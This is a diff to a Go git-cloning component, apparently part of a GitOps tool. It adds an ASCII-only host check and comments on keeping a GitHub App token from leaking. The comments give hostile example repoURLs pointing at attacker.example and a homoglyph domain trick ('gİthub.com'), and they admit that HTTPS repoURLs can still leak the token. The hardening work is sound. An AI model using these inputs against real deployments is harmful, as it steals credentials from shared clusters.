@@ -50,7 +50,9 @@ type Differ struct {
 	// their HTTPS equivalent (see effectiveCloneURL). It must be the host the
 	// TokenSource credential belongs to. Empty (the default) disables the rewrite
 	// entirely — fail closed — so a Differ that does not know where its credential
-	// is valid never turns an SSH URL into a live HTTPS request.
+	// is valid never turns an SSH URL into a live HTTPS request. It bounds the
+	// rewrite only; it is not a general credential boundary, and an HTTPS clone
+	// URL is unaffected by it (see effectiveCloneURL).
 	//
 	// It is deliberately NOT TokenHost, and folding the two together would be a
 	// silent regression in one direction or the other. TokenHost governs which
@@ -192,8 +194,9 @@ func (d *Differ) auth(ctx context.Context, cloneURL string) (transport.AuthMetho
 // An SSH rawURL is rewritten to its HTTPS equivalent first (see
 // effectiveCloneURL); every downstream key — clone cache, mirror dir, auth host
 // check — is derived from that ONE effective URL, so the URL authorized is
-// always the URL dialled, and an ssh:// and https:// spelling of the same repo
-// share a mirror instead of cloning twice.
+// always the URL dialled. Keys are the effective URL verbatim, not a canonical
+// form: two spellings of one repo share a clone only when they rewrite to the
+// same bytes, and case or a ".git" suffix is enough to keep them apart.
 func (d *Differ) cloneToDisk(ctx context.Context, rawURL string) (*git.Repository, func(), error) {
 	noop := func() {}
 	url := d.effectiveCloneURL(rawURL)
@@ -251,17 +254,24 @@ func (d *Differ) cloneToDisk(ctx context.Context, rawURL string) (*git.Repositor
 // very same repository; the installation still scopes what may be read, so this
 // grants no access the operator had not already granted.
 //
-// The rewrite is applied ONLY toward SSHRewriteHost, the host the credential is
-// actually for, and only when there is a credential at all. That confinement is
-// load-bearing, not tidiness. A GitOps repoURL is cluster state, so in a shared
-// cluster anyone who can create an Application picks it; the what_changed differ
+// The rewrite fires only toward SSHRewriteHost — the host the credential is for,
+// compared on an ASCII-only host so the comparison cannot disagree with the host
+// net/http will dial (see sshToHTTPS) — and only when there is a credential at
+// all. That confinement is load-bearing. A GitOps repoURL is cluster state, so in
+// a shared cluster anyone who can create an Application picks it, and this differ
 // runs with TokenHost empty, meaning auth attaches the App token to whatever host
-// it ends up cloning. Before this rewrite existed, "invalid auth method" rejected
-// every SSH URL before a single byte left the process — the bug was inadvertently
-// acting as a CREDENTIAL BOUNDARY. Rewriting unconfined would have removed that
-// boundary and turned "repoURL: ssh://git@attacker.example/x" into the App
-// installation token being POSTed to attacker.example. Do not "simplify" this
-// host check away without replacing what it holds.
+// it clones. Unconfined, the rewrite would turn
+// "repoURL: ssh://git@attacker.example/x" into that token being POSTed to
+// attacker.example. Do not "simplify" the host check away.
+//
+// WHAT THIS DOES NOT DO. It narrows the SSH path only. A hostile HTTPS repoURL —
+// "repoURL: https://attacker.example/x" — still receives the token today: auth is
+// unconfined on this differ and the rewrite never sees an HTTPS URL. That hole
+// predates the rewrite and is not closed here. Closing it means confining
+// TokenHost on this differ, which needs an operator override for a GitHub
+// Enterprise install whose API host differs from its git host, and is its own
+// change. Read this check as "the rewrite cannot introduce a new leak", not as a
+// credential boundary — it is not one.
 //
 // With no TokenSource (public or local repos) the raw SSH URL is kept so go-git's
 // default SSH-agent path remains available — rewriting it would trade a working
@@ -292,8 +302,22 @@ func (d *Differ) effectiveCloneURL(rawURL string) string {
 // carrying userinfo would let a crafted URL smuggle credentials into the
 // rewritten URL's authority.
 //
+// The host must also be pure ASCII. Every host comparison in this package goes
+// through hostOf, which lowercases with strings.ToLower — Unicode SIMPLE case
+// mapping — while net/http resolves the very same URL through
+// idna.Lookup.ToASCII. The two disagree on non-ASCII input, which puts the
+// authorization check on the wrong side of the disagreement: ToLower maps U+0130
+// ('İ') to 'i', so "gİthub.com" reads as "github.com" to effectiveCloneURL while
+// net/http dials the separately registrable "xn--github-qyd.com" — an attacker
+// registers it, serves a valid cert, and reads the App token off the
+// Authorization header. Refusing non-ASCII hosts kills the whole class
+// (homoglyphs, fullwidth forms, ZWSP, soft hyphen), not the one rune;
+// internal/sourcerepo's allowlist refuses them for the same reason, see
+// firstDisallowedRepoChar there.
+//
 // A rewrite is then either FAITHFUL or does not happen: the result must parse
-// back to exactly the host and path it was built from. An SSH path is opaque
+// back to the same host — up to ASCII case, since this comparison is EqualFold —
+// and the byte-identical path it was built from. An SSH path is opaque
 // bytes while an HTTPS path is not, so the path half of that round trip refuses a
 // '?' or '#' that would silently become a query or fragment, and percent-encoded
 // traversal ("%2e%2e") that a literal ".." scan misses. The host half is the
@@ -309,7 +333,7 @@ func (d *Differ) effectiveCloneURL(rawURL string) string {
 // Refusal costs nothing — the caller simply keeps the raw URL.
 func sshToHTTPS(rawURL string) (string, bool) {
 	ep, err := transport.NewEndpoint(strings.TrimSpace(rawURL))
-	if err != nil || ep.Protocol != "ssh" || ep.Host == "" {
+	if err != nil || ep.Protocol != "ssh" || ep.Host == "" || !isASCII(ep.Host) {
 		return "", false
 	}
 	repoPath := strings.TrimPrefix(ep.Path, "/")
@@ -324,10 +348,31 @@ func sshToHTTPS(rawURL string) (string, bool) {
 	return out, true
 }
 
+// isASCII reports whether s is free of bytes outside 7-bit ASCII. It is the
+// host-side guard in sshToHTTPS: see that function's comment for why a non-ASCII
+// host makes strings.ToLower and idna.Lookup.ToASCII disagree about which host is
+// being named.
+func isASCII(s string) bool {
+	for i := 0; i < len(s); i++ {
+		if s[i] >= 0x80 {
+			return false
+		}
+	}
+	return true
+}
+
 // hostOf returns the lowercased host of an https/http/ssh clone URL, or "" for
-// a local path or an unparseable/hostless URL. Used by auth to confine a
-// host-scoped token; a "" host never equals a non-empty TokenHost, so a local
+// a local path or an unparseable/hostless URL.
+//
+// Two callers, and the second is stricter than the first. auth uses it to confine
+// a host-scoped token: a "" host never equals a non-empty TokenHost, so a local
 // clone is always treated as off-host (correct — local repos need no token).
+// effectiveCloneURL uses it to AUTHORIZE turning an SSH URL into a live HTTPS
+// request, which demands that the host named here be the host that is actually
+// dialled. strings.ToLower does not guarantee that for non-ASCII input, so
+// sshToHTTPS refuses non-ASCII hosts before this is ever consulted for that
+// decision. Anything else routed through here for an authorization decision needs
+// the same precaution.
 func hostOf(cloneURL string) string {
 	u, err := url.Parse(cloneURL)
 	if err != nil {
